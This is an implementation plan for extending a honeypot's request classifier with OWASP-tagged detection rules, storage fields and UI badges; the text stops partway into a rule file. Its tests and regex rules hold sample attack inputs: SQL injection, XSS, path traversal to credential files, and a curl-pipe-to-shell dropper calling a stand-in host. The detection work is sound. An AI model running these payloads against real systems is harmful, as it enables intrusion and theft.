# Classification Expansion Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Expand peephole's classification from 7 to 16 rule families (adding SSRF, injection variants, webshells, deserialization, AI/MCP, cloud, API, credential, CMS coverage), tag every rule with OWASP references, and surface tags plus label-family colors in the web UI.

**Architecture:** Rules-only expansion on the existing engine: weights stay 1..=4 (= severity = scan level), labels stay opaque strings. One small engine addition — an optional `owasp` field per rule — is plumbed Rule → CompiledRule → Verdict → `requests.owasp_json` (added to the initial schema; fresh installs, no migration) → cluster `RequestRec` (forward-compat serde) → browse/stats/export read paths → UI badges. Label colors are resolved by a suffix rule (`-probe` → recon) plus a short explicit map.

**Tech Stack:** Rust, sqlx (SQLite), askama templates, plain CSS tokens, TOML rule files, cargo test.

**Spec:** `docs/superpowers/specs/2026-10-02-classification-expansion-design.md`

## Global Constraints

- Weights stay in `1..=4`; no new scan levels, no nmap preset changes, no cluster protocol bump.
- No new migration file: schema changes go directly into `src/store/migrations/0001_initial.sql` (all nodes install fresh).
- Regexes in rule files use TOML literal strings (`'''…'''`) when they contain backslashes or quotes; the engine compiles every pattern case-insensitively (`(?i)`), so rule text never needs inline flags.
- Every *shipped* rule carries an `owasp` tag; the field stays optional for operator rules.
- Anchoring convention: path signatures anchor at segment boundaries (`/`, `?`, or end) so ordinary pages do not match — match the style of the existing files.
- Conventional commits (`feat(classify): …`, `feat(store): …`, `feat(admin): …`, `docs: …`), one commit per task.
- Behavioral labels generated in code (`probe`, `path-scanner`, `form-interaction`, `write-method`, `proxy-probe`, `unusual-method`, `automation`, `inhuman-behavior`, `fp-claim`) are unchanged and carry no OWASP tags.
- CI gates (`.github/workflows/ci.yml`): `cargo fmt --all -- --check`, `cargo clippy --all-targets --locked -- -D warnings`, `cargo test --locked`.

---

### Task 1: `owasp` field through the rule engine

**Files:**
- Modify: `src/classify/rules.rs` (Rule struct, validate(), tests)
- Modify: `src/classify/mod.rs` (CompiledRule, Verdict, classify(), from_dir, tests)
- Modify: `src/trap/mod.rs:416-421` (fp-claim Verdict literal — compile fix only)

**Interfaces:**
- Consumes: nothing new.
- Produces: `Rule::owasp: Option<Vec<String>>`; `Verdict { severity: u8, scan_level: u8, labels: Vec<String>, owasp: Vec<String> }` — later tasks and `src/trap/mod.rs` rely on the `owasp` field being sorted and deduped.

- [ ] **Step 1: Write the failing tests**

In `src/classify/rules.rs` tests module, add:

```rust
    #[test]
    fn owasp_tags_are_validated() {
        assert!(
            one("[[rule]]\nlabel=\"x\"\nweight=2\ntarget_regex=\"a\"\nowasp=[\"A03:2021\",\"OAT-014\"]\n").is_ok()
        );
        assert!(one("[[rule]]\nlabel=\"x\"\nweight=2\ntarget_regex=\"a\"\nowasp=[\"A13:2021\"]\n").is_err());
        assert!(one("[[rule]]\nlabel=\"x\"\nweight=2\ntarget_regex=\"a\"\nowasp=[\"T1190\"]\n").is_err());
        // Absent stays legal for operator rules.
        assert!(one("[[rule]]\nlabel=\"x\"\nweight=2\ntarget_regex=\"a\"\n").is_ok());
    }
```

In `src/classify/mod.rs` tests module, add:

```rust
    #[test]
    fn hit_rules_contribute_owasp_tags() {
        let v = classifier().classify(
            &view("GET", "/login", Some("id=1%27%20OR%201%3D1--"), "curl/8", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "sqli"), "{:?}", v.labels);
        assert_eq!(v.owasp, vec!["A03:2021".to_string()]);
        // A request hitting no signature rule has no tags.
        let plain = classifier().classify(
            &view("GET", "/nonexistent", None, "Mozilla/5.0", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(plain.owasp.is_empty(), "{:?}", plain.owasp);
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test owasp`
Expected: FAIL to compile (`no field named 'owasp'`) or, once it compiles partially, `assertion failed` on `v.owasp`.

- [ ] **Step 3: Implement the field**

In `src/classify/rules.rs`, add to `struct Rule` (after `methods`):

```rust
    /// OWASP references for the family: Top-10 2021 classes (`A03:2021`)
    /// and/or Automated Threats (`OAT-014`). Optional; all shipped rules
    /// carry it (a meta-test enforces that).
    pub owasp: Option<Vec<String>>,
```

In `Rule::validate`, after the weight check, add:

```rust
        for tag in self.owasp.iter().flatten() {
            let top10 = tag
                .strip_prefix('A')
                .and_then(|r| r.strip_suffix(":2021"))
                .is_some_and(|n| n.len() == 2 && n.bytes().all(|b| b.is_ascii_digit()) && n != "00");
            let oat = tag
                .strip_prefix("OAT-0")
                .is_some_and(|n| n.len() == 2 && n.bytes().all(|b| b.is_ascii_digit()));
            if !top10 && !oat {
                anyhow::bail!("rule `{}` has an invalid owasp tag `{tag}`", self.label);
            }
        }
```

In `src/classify/mod.rs`:

- Add to `struct Verdict` (after `labels`):

```rust
    pub owasp: Vec<String>,
```

- Add to `struct CompiledRule` (after `path_exact`):

```rust
    owasp: Vec<String>,
```

- In `Classifier::from_dir`'s mapping, add to the `CompiledRule` literal:

```rust
                    owasp: r.owasp.unwrap_or_default(),
```

- In `classify()`: declare `let mut owasp: Vec<String> = vec![];` next to `labels`; inside `if hit { … }` add `owasp.extend(r.owasp.iter().cloned());`; next to `labels.sort(); labels.dedup();` add:

```rust
        owasp.sort();
        owasp.dedup();
```

and add `owasp,` to the returned `Verdict { … }`.

In `src/trap/mod.rs` (the fp-claim literal, lines ~416-421), add the field so the crate compiles:

```rust
        crate::classify::Verdict {
            severity: 0,
            scan_level: 0,
            labels: vec!["fp-claim".into()],
            owasp: vec![],
        }
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test classify`
Expected: PASS, including `owasp_tags_are_validated` and `hit_rules_contribute_owasp_tags`. (Note: the sqli corpus test expects exactly `["A03:2021"]` — Task 5 adds the tag to `rules/sqli.toml`; until then this test fails on the tag mismatch. Add `owasp = ["A03:2021"]` to both rules in `rules/sqli.toml` now to make it pass; the rest of sqli.toml's changes land in Task 5.)

- [ ] **Step 5: Commit**

```bash
git add src/classify/rules.rs src/classify/mod.rs src/trap/mod.rs rules/sqli.toml
git commit -m "feat(classify): optional owasp tag per rule, carried into the verdict"
```

---

### Task 2: Storage, cluster record and trap write path

**Files:**
- Modify: `src/store/migrations/0001_initial.sql:9-16` (requests table)
- Modify: `src/cluster/record.rs:33-80` (RequestRec)
- Modify: `src/store/requests.rs` (NewRequest, RequestRow, tests)
- Modify: `src/store/recorder.rs:136-160` (insert_request_from)
- Modify: `src/store/data.rs:216-257` (apply `request`)
- Modify: `src/trap/mod.rs:434-460` (NewRequest population)

**Interfaces:**
- Consumes: `Verdict::owasp` from Task 1.
- Produces: `requests.owasp_json TEXT NOT NULL DEFAULT '[]'`; `RequestRec::owasp_json: Option<String>`; `NewRequest::owasp_json: Option<String>`; `RequestRow::owasp_json: String` — Task 3's read paths and `src/trap/mod.rs` rely on these names.

- [ ] **Step 1: Write the failing tests**

In `src/cluster/record.rs` tests module, add:

```rust
    #[test]
    fn a_request_record_without_owasp_rebuilds_byte_for_byte() {
        let rec = Record::Request(RequestRec {
            uid: "u".into(),
            ts: "2026-10-02 00:00:00".into(),
            ip: "198.51.100.1".into(),
            method: "GET".into(),
            path: "/".into(),
            query: None,
            headers_json: "[]".into(),
            body: None,
            labels_json: "[]".into(),
            severity: 0,
            scan_level: 0,
            is_fp_claim: false,
            page_token: None,
            ..Default::default()
        });
        let bytes = super::super::rpc::cbor::encode(&rec).unwrap();
        assert!(
            !bytes.windows(10).any(|w| w == b"owasp_json"),
            "None must be left out of the encoding"
        );
        let back: Record = super::super::rpc::cbor::decode(&bytes).unwrap();
        assert_eq!(back, rec);
        assert_eq!(super::super::rpc::cbor::encode(&back).unwrap(), bytes);
    }
```

In `src/store/requests.rs` tests module, extend `insert_request_roundtrip`: add `owasp_json: Some(r#"["A03:2021"]"#.into()),` to the `NewRequest` literal and, after fetching the row, `assert_eq!(row.owasp_json, r#"["A03:2021"]"#);`. Add a new test:

```rust
    #[tokio::test]
    async fn owasp_json_defaults_to_an_empty_array() {
        let s = test_store().await;
        let ip = s.upsert_ip("198.51.100.11".parse().unwrap()).await.unwrap();
        let id = s
            .insert_request(&NewRequest {
                ip_id: ip.id,
                method: "GET".into(),
                path: "/".into(),
                headers_json: "[]".into(),
                labels_json: "[]".into(),
                ..Default::default()
            })
            .await
            .unwrap();
        let row = s.request_by_id(id).await.unwrap().unwrap();
        assert_eq!(row.owasp_json, "[]");
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test store::requests cluster::record`
Expected: FAIL to compile (`no field named 'owasp_json'`).

- [ ] **Step 3: Implement**

In `src/store/migrations/0001_initial.sql`, change the requests table's labels line to:

```sql
  labels_json TEXT NOT NULL DEFAULT '[]',
  owasp_json TEXT NOT NULL DEFAULT '[]', severity INTEGER NOT NULL DEFAULT 0,
```

In `src/cluster/record.rs`, add at the END of `struct RequestRec` (after `ja4`; appended fields keep old encodings stable):

```rust
    /// OWASP tags of the hit rules, as a JSON array; absent for records
    /// written before the field existed (stored as `[]`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub owasp_json: Option<String>,
```

In `src/store/requests.rs`: add to `NewRequest` (with the dataset fields):

```rust
    /// JSON array of OWASP tags from the verdict; None stores `'[]'`.
    pub owasp_json: Option<String>,
```

and to `RequestRow` (after `labels_json`):

```rust
    pub owasp_json: String,
```

In `src/store/recorder.rs` `insert_request_from`, add to the `RequestRec` literal (after `labels_json: n.labels_json.clone(),`):

```rust
            owasp_json: n.owasp_json.clone(),
```

In `src/store/data.rs` `request()`, change the INSERT to:

```rust
        "INSERT OR IGNORE INTO requests (uid, origin, hlc, ts, ip_id, method, path, query,
           headers_json, body, labels_json, owasp_json, severity, scan_level, is_fp_claim, page_token,
           answer, status, unrecorded, transport, via_proxy, raw_head, tls_client_hello, ja4)
         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
```

and add the bind directly after `.bind(&r.labels_json)`:

```rust
    .bind(r.owasp_json.as_deref().unwrap_or("[]"))
```

In `src/trap/mod.rs` `record()`, add to the `NewRequest` literal (after `labels_json: serde_json::to_string(&verdict.labels)?,`):

```rust
                owasp_json: Some(serde_json::to_string(&verdict.owasp)?),
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test store:: cluster::record`
Expected: PASS, including `owasp_json_defaults_to_an_empty_array`, `insert_request_roundtrip`, and `a_request_record_without_owasp_rebuilds_byte_for_byte`.

- [ ] **Step 5: Commit**

```bash
git add src/store/migrations/0001_initial.sql src/cluster/record.rs src/store/requests.rs src/store/recorder.rs src/store/data.rs src/trap/mod.rs
git commit -m "feat(store): requests.owasp_json, replicated with forward-compatible encoding"
```

---

### Task 3: Read paths — browse list, wall stats, export

**Files:**
- Modify: `src/store/browse.rs:118-137` (RequestListRow + `owasp()`), `:220-228` (request_row_select)
- Modify: `src/store/stats.rs:86-97` (RecentRequest), `:152` (RecentTuple), `:375-402` (recent SELECT + mapping)
- Modify: `src/store/export.rs:11-30` (ReqRow), `:127-128` (SELECT)
- Modify: `src/export/mod.rs:52-101` (ExportRow), `:104-143` (COLUMNS), `:249-296` (to_json), `:553-585` (request_row)

**Interfaces:**
- Consumes: `requests.owasp_json`, `RequestRow::owasp_json` from Task 2.
- Produces: `RequestListRow::owasp() -> Vec<String>` (templates in Task 4 use this); `RecentRequest::owasp: Vec<String>` (wall.html uses this); `ExportRow::owasp: Vec<String>` and CSV/JSONL column `owasp` placed directly after `labels`.

- [ ] **Step 1: Write the failing tests**

In `src/store/browse.rs` tests module, add:

```rust
    #[tokio::test]
    async fn list_rows_expose_owasp_tags() {
        let s = seeded().await;
        let ip = s.upsert_ip("198.51.100.30".parse().unwrap()).await.unwrap();
        s.insert_request(&NewRequest {
            ip_id: ip.id,
            method: "GET".into(),
            path: "/login".into(),
            query: None,
            headers_json: "[]".into(),
            body: None,
            labels_json: r#"["sqli"]"#.into(),
            owasp_json: Some(r#"["A03:2021"]"#.into()),
            severity: 4,
            scan_level: 4,
            is_fp_claim: false,
            page_token: None,
            ..Default::default()
        })
        .await
        .unwrap();
        let page = s
            .search_requests(&RequestFilter::default(), Audience::Admin)
            .await
            .unwrap();
        assert_eq!(page.items[0].owasp(), vec!["A03:2021".to_string()]);
    }
```

In `src/store/stats.rs` tests module, in the test that asserts `h24.recent[0].labels` (around line 816), add `owasp_json: Some(r#"["A03:2021"]"#.into()),` to that test's request fixture and assert `h24.recent[0].owasp == vec!["A03:2021".to_string()]`.

In `src/export/mod.rs` tests module, next to the existing `assert_eq!(v["labels"][0], "sensitive-path");` (line ~857), add `assert_eq!(v["owasp"][0], "A03:2021");` after adding `owasp_json: Some(r#"["A03:2021"]"#.into())` to that test's request fixture, and add a header test:

```rust
    #[test]
    fn csv_has_an_owasp_column_after_labels() {
        let header = csv_header();
        assert!(header.contains(",owasp,severity,"), "{header}");
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test store::browse store::stats export`
Expected: FAIL to compile (`no field named 'owasp_json'` / `no method named 'owasp'`).

- [ ] **Step 3: Implement**

In `src/store/browse.rs`:

- Add to `RequestListRow` (after `labels_json`):

```rust
    pub owasp_json: String,
```

- Extend the impl:

```rust
impl RequestListRow {
    pub fn labels(&self) -> Vec<String> {
        serde_json::from_str(&self.labels_json).unwrap_or_default()
    }
    pub fn owasp(&self) -> Vec<String> {
        serde_json::from_str(&self.owasp_json).unwrap_or_default()
    }
}
```

- In `request_row_select`, add `r.owasp_json,` directly after `r.labels_json,` in the SELECT list.

In `src/store/stats.rs`:

- Add to `RecentRequest` (after `labels`):

```rust
    pub owasp: Vec<String>,
```

- Add a `String` to the `RecentTuple` type alias in the matching position, add `r.owasp_json,` after `r.labels_json,` in the recent SELECT, and extend the tuple destructuring and `RecentRequest` literal:

```rust
                |(id, ts, ip, method, path, severity, labels, owasp, country, is_tor)| RecentRequest {
                    id,
                    ts,
                    ip,
                    method,
                    path,
                    severity,
                    labels: serde_json::from_str(&labels).unwrap_or_default(),
                    owasp: serde_json::from_str(&owasp).unwrap_or_default(),
                    country,
                    is_tor,
                },
```

In `src/store/export.rs`:

- Add to `ReqRow` (after `labels_json`):

```rust
    pub owasp_json: String,
```

- In the request SELECT (line ~127-128), add `r.owasp_json,` directly after `r.labels_json,`.

In `src/export/mod.rs`:

- Add to `ExportRow` (after `labels`):

```rust
    pub owasp: Vec<String>,
```

- In `COLUMNS`, insert `"owasp",` directly after `"labels",`.
- In `to_json`'s `json!`, add `"owasp": self.owasp,` directly after `"labels": self.labels,`.
- In `request_row`'s `ExportRow` literal, add directly after the `labels:` line:

```rust
        owasp: serde_json::from_str(&r.owasp_json).unwrap_or_default(),
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test store::browse store::stats export`
Expected: PASS, including `list_rows_expose_owasp_tags` and `csv_has_an_owasp_column_after_labels`.

- [ ] **Step 5: Commit**

```bash
git add src/store/browse.rs src/store/stats.rs src/store/export.rs src/export/mod.rs
git commit -m "feat(store): owasp tags on request lists, wall recents and exports"
```

---

### Task 4: Web UI — label-family colors and OWASP badges

**Files:**
- Modify: `src/admin/views.rs` (label_class, owasp_name, tests)
- Modify: `assets/css/00-tokens.css` (three theme blocks: light `:root`, dark media query, `:root[data-theme="dark"]`)
- Modify: `assets/css/30-components.css` (badge classes, after line 22)
- Modify: `templates/requests.html:48`
- Modify: `templates/wall.html:95`
- Modify: `templates/request.html:13`
- Modify: `src/admin/pages.rs:443-462` (request detail template struct + handler)

**Interfaces:**
- Consumes: `RequestListRow::owasp()`, `RecentRequest::owasp`, `RequestRow::owasp_json` from Task 3.
- Produces: `crate::admin::views::label_class<S: AsRef<str>>(S) -> &'static str` returning `""`, `"badge-cat-recon"`, `"badge-cat-inject"`, `"badge-cat-impact"`, `"badge-cat-interact"`, `"badge-cat-postex"`, or `"badge-cat-bot"`; `crate::admin::views::owasp_name<S: AsRef<str>>(S) -> &'static str`. Templates call both exactly like the existing `sev_class`.

- [ ] **Step 1: Write the failing tests**

Append to `src/admin/views.rs`:

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn label_families_map_to_their_colour_class() {
        assert_eq!(label_class("sqli"), "badge-cat-inject");
        assert_eq!(label_class("xss"), "badge-cat-inject");
        assert_eq!(label_class("rce"), "badge-cat-impact");
        assert_eq!(label_class("ssrf"), "badge-cat-impact");
        assert_eq!(label_class("form-interaction"), "badge-cat-interact");
        assert_eq!(label_class("credential-attack"), "badge-cat-interact");
        assert_eq!(label_class("webshell"), "badge-cat-postex");
        assert_eq!(label_class("mcp-abuse"), "badge-cat-postex");
        assert_eq!(label_class("automation"), "badge-cat-bot");
        // The suffix rule covers every probe family, including future ones.
        assert_eq!(label_class("appliance-probe"), "badge-cat-recon");
        assert_eq!(label_class("some-future-probe"), "badge-cat-recon");
        // Everything else keeps the neutral accent.
        assert_eq!(label_class("fp-claim"), "");
        assert_eq!(label_class("path-scanner"), "");
    }

    #[test]
    fn owasp_tags_have_names() {
        assert_eq!(owasp_name("A03:2021"), "Injection");
        assert_eq!(owasp_name("A10:2021"), "Server-Side Request Forgery");
        assert_eq!(owasp_name("OAT-014"), "Vulnerability Scanning");
        assert_eq!(owasp_name("OAT-018"), "Footprinting");
        assert_eq!(owasp_name("bogus"), "");
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test admin::views`
Expected: FAIL to compile (`cannot find function 'label_class'`).

- [ ] **Step 3: Implement the helpers**

Append to `src/admin/views.rs` (before the tests module):

```rust
/// CSS modifier class colouring a label by family. The suffix rule comes
/// first so every `-probe` family — including ones added later — is recon
/// blue without touching code; the explicit map covers the rest; anything
/// unknown keeps the neutral `.badge-label` accent.
pub fn label_class<S: AsRef<str>>(label: S) -> &'static str {
    let l = label.as_ref();
    if l.ends_with("-probe") {
        return "badge-cat-recon";
    }
    match l {
        "sqli" | "xss" | "ssti" | "nosqli" | "xxe" | "crlf-injection" => "badge-cat-inject",
        "rce" | "deserialization" | "ssrf" | "path-traversal" => "badge-cat-impact",
        "form-interaction" | "write-method" | "credential-attack" => "badge-cat-interact",
        "webshell" | "mcp-abuse" => "badge-cat-postex",
        "automation" | "inhuman-behavior" | "proxy-probe" | "unusual-method" => "badge-cat-bot",
        _ => "",
    }
}

/// Human name of an OWASP tag, for badge tooltips; "" for unknown tags.
pub fn owasp_name<S: AsRef<str>>(tag: S) -> &'static str {
    match tag.as_ref() {
        "A01:2021" => "Broken Access Control",
        "A02:2021" => "Cryptographic Failures",
        "A03:2021" => "Injection",
        "A04:2021" => "Insecure Design",
        "A05:2021" => "Security Misconfiguration",
        "A06:2021" => "Vulnerable and Outdated Components",
        "A07:2021" => "Identification and Authentication Failures",
        "A08:2021" => "Software and Data Integrity Failures",
        "A09:2021" => "Security Logging and Monitoring Failures",
        "A10:2021" => "Server-Side Request Forgery",
        "OAT-001" => "Carding",
        "OAT-002" => "Token Cracking",
        "OAT-003" => "Ad Fraud",
        "OAT-004" => "Fingerprinting",
        "OAT-005" => "Scalping",
        "OAT-006" => "Expediting",
        "OAT-007" => "Account Cracking",
        "OAT-008" => "Credential Stuffing",
        "OAT-009" => "CAPTCHA Bypass",
        "OAT-010" => "Card Cracking",
        "OAT-011" => "Scraping",
        "OAT-012" => "Cashing Out",
        "OAT-013" => "Sniping",
        "OAT-014" => "Vulnerability Scanning",
        "OAT-015" => "Denial of Service",
        "OAT-016" => "Skewing",
        "OAT-017" => "Spam",
        "OAT-018" => "Footprinting",
        "OAT-019" => "Account Creation",
        "OAT-020" => "Account Aggregation",
        "OAT-021" => "Denial of Inventory",
        _ => "",
    }
}
```

- [ ] **Step 4: CSS tokens and badge classes**

In `assets/css/00-tokens.css`, in the light `:root` block (after the `--sev-*` lines, ~line 68):

```css
  /* Label families: recon blue, injection red, impact violet, interaction
     orange, bot grey. Post-exploitation is a solid badge (no tokens). */
  --cat-recon: #1d4ed8;    --cat-recon-dim: rgba(29, 78, 216, 0.12);
  --cat-inject: #b31c1c;   --cat-inject-dim: rgba(179, 28, 28, 0.12);
  --cat-impact: #7a1fa2;   --cat-impact-dim: rgba(122, 31, 162, 0.12);
  --cat-interact: #b04a00; --cat-interact-dim: rgba(176, 74, 0, 0.12);
  --cat-bot: #63656c;      --cat-bot-dim: rgba(99, 101, 108, 0.14);
```

In BOTH dark blocks (the `@media (prefers-color-scheme: dark)` block and `:root[data-theme="dark"]`, after their `--sev-*` lines):

```css
    --cat-recon: #7aa2ff;    --cat-recon-dim: rgba(122, 162, 255, 0.15);
    --cat-inject: #ff5c5c;   --cat-inject-dim: rgba(255, 92, 92, 0.15);
    --cat-impact: #d17dff;   --cat-impact-dim: rgba(209, 125, 255, 0.15);
    --cat-interact: #ff9440; --cat-interact-dim: rgba(255, 148, 64, 0.15);
    --cat-bot: #9a9eb2;      --cat-bot-dim: rgba(154, 158, 178, 0.16);
```

(Indent with two spaces in the `:root[data-theme="dark"]` block, matching its body.)

In `assets/css/30-components.css`, after `.badge-label` (line 22):

```css
.badge-cat-recon { background: var(--cat-recon-dim); color: var(--cat-recon); border-color: var(--cat-recon); }
.badge-cat-inject { background: var(--cat-inject-dim); color: var(--cat-inject); border-color: var(--cat-inject); }
.badge-cat-impact { background: var(--cat-impact-dim); color: var(--cat-impact); border-color: var(--cat-impact); }
.badge-cat-interact { background: var(--cat-interact-dim); color: var(--cat-interact); border-color: var(--cat-interact); }
.badge-cat-bot { background: var(--cat-bot-dim); color: var(--cat-bot); border-color: var(--cat-bot); }
.badge-cat-postex { background: var(--color-fg-primary); color: var(--color-bg-base); border-color: var(--color-fg-primary); }
.badge-owasp { background: transparent; color: var(--color-fg-muted); border-color: var(--color-border-strong); font-family: var(--font-mono); }
```

- [ ] **Step 5: Templates**

In `templates/requests.html`, replace line 48's chips cell with:

```html
      <td><span class="chips">{% for l in r.labels() %}<span class="badge badge-label {{ crate::admin::views::label_class(l) }}">{{ l }}</span>{% endfor %}{% for o in r.owasp() %}<span class="badge badge-owasp" title="{{ crate::admin::views::owasp_name(o) }}">{{ o }}</span>{% endfor %}</span></td>
```

In `templates/wall.html`, replace line 95's chips cell with:

```html
          <td><span class="chips">{% for l in r.labels %}<span class="badge badge-label {{ crate::admin::views::label_class(l) }}">{{ l }}</span>{% endfor %}{% for o in r.owasp %}<span class="badge badge-owasp" title="{{ crate::admin::views::owasp_name(o) }}">{{ o }}</span>{% endfor %}</span></td>
```

In `templates/request.html`, replace line 13's Labels card with:

```html
  <section class="card"><h2>Labels</h2><div class="chips">{% for l in labels %}<span class="badge badge-label {{ crate::admin::views::label_class(l) }}">{{ l }}</span>{% endfor %}{% for o in owasp %}<span class="badge badge-owasp" title="{{ crate::admin::views::owasp_name(o) }}">{{ o }}</span>{% endfor %}{% if labels.is_empty() && owasp.is_empty() %}<span class="muted">none</span>{% endif %}</div></section>
```

In `src/admin/pages.rs`, in the `request.html` template struct (~line 443-447), add after `labels: Vec<String>,`:

```rust
    owasp: Vec<String>,
```

and in its handler (~line 458-462), after the `labels` parse add:

```rust
    let owasp = serde_json::from_str(&d.row.owasp_json).unwrap_or_default();
```

and `owasp,` to the struct literal.

- [ ] **Step 6: Verify templates compile and helpers pass**

Run: `cargo test admin`
Expected: PASS, including `label_families_map_to_their_colour_class` and `owasp_tags_have_names`; all template-rendering tests still pass (askama compiles templates at build time, so a template typo fails the build).

- [ ] **Step 7: Commit**

```bash
git add src/admin/views.rs assets/css/00-tokens.css assets/css/30-components.css templates/requests.html templates/wall.html templates/request.html src/admin/pages.rs
git commit -m "feat(admin): label-family colours and owasp badges on request views"
```

---

### Task 5: Existing rule files — OWASP tags and coverage additions

**Files:**
- Modify: `rules/sqli.toml`, `rules/xss.toml`, `rules/traversal.toml`, `rules/rce.toml`, `rules/paths.toml`, `rules/appliances.toml`, `rules/scanners.toml` (full replacements below)
- Test: `src/classify/mod.rs` tests module

**Interfaces:**
- Consumes: Task 1's `owasp` field.
- Produces: new label `research-scanner` (weight 2, OAT-018); all other labels unchanged. `label_class("research-scanner")` resolves via the explicit map — see the small views.rs addition in Step 4.

- [ ] **Step 1: Write the failing corpus tests**

In `src/classify/mod.rs` tests module, add:

```rust
    #[test]
    fn sqli_additions_are_caught() {
        for q in [
            "id=1;waitfor%20delay%20'0:0:5'",
            "id=1%20or%20pg_sleep(5)--",
            "id=1%20union%20select%20load_file('/etc/passwd')",
            "id=1;exec%20xp_cmdshell%20'whoami'",
        ] {
            let v = classifier().classify(&view("GET", "/item", Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "sqli"), "{q}: {:?}", v.labels);
        }
    }

    #[test]
    fn xss_additions_are_caught() {
        for q in [
            "q=<svg/onload=alert(1)>",
            "q=%3Cimg%20src=x%20onerror=alert(1)%3E",
            "q=<iframe%20src=//evil>",
            "q=alert(document.cookie)",
        ] {
            let v = classifier().classify(&view("GET", "/search", Some(q), "Mozilla/5.0", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "xss"), "{q}: {:?}", v.labels);
        }
    }

    #[test]
    fn traversal_additions_are_caught() {
        for q in [
            "f=..;/..;/etc/passwd",
            "f=php://filter/convert.base64-encode/resource=index.php",
            "f=/etc/shadow",
            "f=/proc/version",
        ] {
            let v = classifier().classify(&view("GET", "/x", Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "path-traversal"), "{q}: {:?}", v.labels);
        }
    }

    #[test]
    fn rce_dropper_chain_in_query_is_caught() {
        for q in ["u=a;wget%20http://evil/x", "u=a;curl%20http://evil/x|sh", "u=a;busybox%20wget%20http://evil"] {
            let v = classifier().classify(&view("GET", "/ping", Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "rce"), "{q}: {:?}", v.labels);
        }
    }

    #[test]
    fn backup_and_debug_paths_are_sensitive() {
        for p in ["/backup.sql", "/www.zip", "/app_dev.php", "/_profiler/", "/elmah.axd", "/debug/vars", "/web.config", "/composer.json", "/terraform.tfstate", "/id_rsa", "/.kube/config"] {
            let v = classifier().classify(&view("GET", p, None, "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "sensitive-path"), "{p}: {:?}", v.labels);
        }
    }

    #[test]
    fn iot_probe_additions_are_caught() {
        for p in ["/picsdesc.xml", "/ctrlt/DeviceUpgrade_1", "/setup.cgi?next_file=netgear.cfg", "/JNAP/", "/SDK/webLanguage", "/doc/page/login.asp", "/RPC2_Login"] {
            let v = classifier().classify(&view("GET", p, None, "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "iot-probe"), "{p}: {:?}", v.labels);
        }
    }

    #[test]
    fn research_scanner_uas_get_their_own_label() {
        for ua in ["CensysInspect/1.1", "Expanse, a Palo Alto Networks company", "Mozilla/5.0 (compatible; shadowserver)", "binaryedge-bot", "stretchoid"] {
            let v = classifier().classify(&view("GET", "/", None, ua, None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "research-scanner"), "{ua}: {:?}", v.labels);
        }
        let v = classifier().classify(&view("GET", "/", None, "sqlmap/1.7", None), &hist(1, 1), &BotTells::default());
        assert!(v.labels.contains(&"scanner-ua".to_string()));
        assert!(!v.labels.contains(&"research-scanner".to_string()));
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test classify`
Expected: the new tests FAIL (labels missing); the existing corpus still passes.

- [ ] **Step 3: Replace the seven rule files**

`rules/sqli.toml`:

```toml
# SQL injection. Matched against raw and percent-decoded text, so encoded
# payloads (%27%20OR, UNION%09SELECT via + / %xx) are caught. UNION may be
# followed by ALL/DISTINCT and separated by comments (union/**/select);
# MySQL versioned comments (/*!50000union*/) count too.

[[rule]]
label = "sqli"
weight = 4
owasp = ["A03:2021"]
target_regex = '''('|%27)(\s|%20|\+)*(or|and)(\s|%20|\+)+('|%27)?[0-9'=%20\+]+('|%27)?=|union(\s|%20|%09|%0a|\+|/\*.*?\*/)+((all|distinct)(\s|%20|%09|%0a|\+|/\*.*?\*/)+)?select\b|/\*!\d*\s*(union|select)\b|information_schema|sleep\s*\(|benchmark\s*\(|updatexml|extractvalue|waitfor\s+delay\s*('|%27|")?[0-9]|pg_sleep\s*\(|dbms_pipe\.receive_message\s*\(|xp_cmdshell|load_file\s*\(|into\s+(out|dump)file'''

[[rule]]
label = "sqli"
weight = 4
owasp = ["A03:2021"]
# Body form: the boolean-logic clause must be followed by a quote, digit or
# paren, so ordinary English such as "users' and admins" does not match.
body_regex = '''('|%27)\s*(or|and)\s+('|"|[0-9(])|union(\s|/\*.*?\*/)+((all|distinct)(\s|/\*.*?\*/)+)?select\b|/\*!\d*\s*(union|select)\b|sleep\s*\(|benchmark\s*\(|information_schema|waitfor\s+delay|pg_sleep\s*\(|xp_cmdshell|into\s+(out|dump)file'''
```

`rules/xss.toml`:

```toml
[[rule]]
label = "xss"
weight = 3
owasp = ["A03:2021"]
target_regex = "<script|%3Cscript|javascript:|onerror\\s*=|onload\\s*=|<svg|<img[\\s/]|<iframe|alert\\s*\\(|confirm\\s*\\(|prompt\\s*\\(|document\\.(cookie|location)|fromCharCode"
# In a body (form fields, JSON) prose can mention "javascript: the good
# parts", so the scheme needs a payload right after it and event handlers
# must sit inside a tag.
body_regex = '''<script|<svg|javascript:[^\s]|<[a-z][^>]*\son(error|load|mouseover|focus|toggle|click|pointerover|animationstart)\s*='''
```

`rules/traversal.toml`:

```toml
# Path traversal. Decoding (two passes) turns ..%2f, ..%5c and double-encoded
